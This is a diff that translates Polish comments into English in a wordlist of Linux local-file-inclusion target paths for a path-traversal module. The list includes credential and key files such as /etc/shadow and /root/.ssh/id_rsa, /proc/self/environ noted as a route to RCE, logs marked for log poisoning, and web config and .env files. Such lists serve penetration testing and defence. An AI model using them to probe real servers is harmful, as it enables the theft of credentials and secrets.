@@ -1,7 +1,7 @@
-# Cele LFI dla Linuksa. Bez prefiksów ../ — te dokłada moduł traversal.
-# Jedna ścieżka na linię, # = komentarz.
+# Linux LFI targets. No ../ prefixes — the traversal module adds those.
+# One path per line, # = comment.
 
-# --- system / konta ---
+# --- system / accounts ---
 /etc/passwd
 /etc/shadow
 /etc/group
@@ -18,7 +18,7 @@
 /root/.ssh/id_rsa
 /root/.ssh/authorized_keys
 
-# --- proc (info o żywym procesie, przydatne do RCE przez /proc/self/environ) ---
+# --- proc (live process info, useful for RCE via /proc/self/environ) ---
 /proc/self/environ
 /proc/self/cmdline
 /proc/self/status
@@ -27,7 +27,7 @@
 /proc/mounts
 /proc/net/tcp
 
-# --- logi (kandydaci pod log poisoning / wyciek ścieżek) ---
+# --- logs (candidates for log poisoning / path disclosure) ---
 /var/log/apache2/access.log
 /var/log/apache2/error.log
 /var/log/nginx/access.log
@@ -36,7 +36,7 @@
 /var/log/syslog
 /var/log/mail.log
 
-# --- konfiguracja aplikacji webowych ---
+# --- web application config ---
 /var/www/html/config.php
 /var/www/html/wp-config.php
 /var/www/html/.env
@@ -48,7 +48,7 @@
 ../database.yml
 ../.env
 
-# --- php.ini (sprawdzenie allow_url_include / disable_functions) ---
+# --- php.ini (check allow_url_include / disable_functions) ---
 /etc/php/7.4/apache2/php.ini
 /etc/php/8.1/apache2/php.ini
 /etc/php/8.2/apache2/php.ini
